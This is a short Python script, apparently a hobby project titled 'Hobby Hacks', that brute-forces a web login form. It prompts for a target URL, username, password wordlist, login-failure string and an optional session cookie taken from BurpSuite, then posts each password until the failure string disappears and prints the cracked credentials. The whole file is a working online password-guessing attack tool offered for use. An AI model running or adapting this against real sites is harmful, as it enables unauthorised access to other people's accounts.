import requests
#from termcolor import colored #TODO add in future update

#TODO make more dynamic and use default values
#TODO add password file default found on the internet of common passwords

url = input("[+] Enter URL: ")
username = input("[+] Enter Username For Account To Bruteforce: ")
password_file = input("[+] Enter Password File To Use: ")
login_failed_string = input("[+] Enter String That Occurs When Login Fails: ")
#TODO Add in future update
request_type = input("[+] Enter The Request Type (GET/POST): ")
#TODO add in future update that default is username/password but can be changed whatever the user wants to use
# Use BurpSuite to find the cookie value
cookie_value = input("[+] Enter Cookie Value If Within Session (Optional): ")
#TODO dynamically take in the name of the button

def cracking(username, url):
  for line in f:
        password = line.strip()

        if cookie_value != "":
          response = requests.get(url, data={"username":username, "password":password, "Login":"submit"}, cookies={"Cookie":cookie_value})
        else:   
          response = requests.post(url, data={"username":username, "password":password, "Login":"Login"})
        
        content = response.content.decode('utf-8')

        if login_failed_string not in content:
            print(f"[+] Found Username: {username}")
            print(f"[+] Found Password: {password}")
            exit()

def ascii_art():
  print('HH   HH   OOOO   BBBB   BBBB   YY   YY')
  print('HH   HH  OO  OO  BB  B  BB  B   YY YY ')
  print('HHHHHHH  OO  OO  BBBB   BBBB     YYY  ')
  print('HH   HH  OO  OO  BB  B  BB  B    YYY ')
  print('HH   HH   OOOO   BBBB   BBBB     YYY  ')
  print('')
  print('HH   HH   AAAA   CCCCC  KK  KK  SSSSS')
  print('HH   HH  AA  AA  CC     KK KK   SS     ')
  print('HHHHHHH AAAAAAA  CC     KKK     SSSSS ')
  print('HH   HH AA   AA  CC     KK KK      SS ')
  print('HH   HH AA   AA  CCCCC  KK  KK  SSSSS  ')



if __name__ == "__main__":
    ascii_art()
    with open(password_file, "r") as f:
        cracking(username, url)

print("Password did not match any in the list")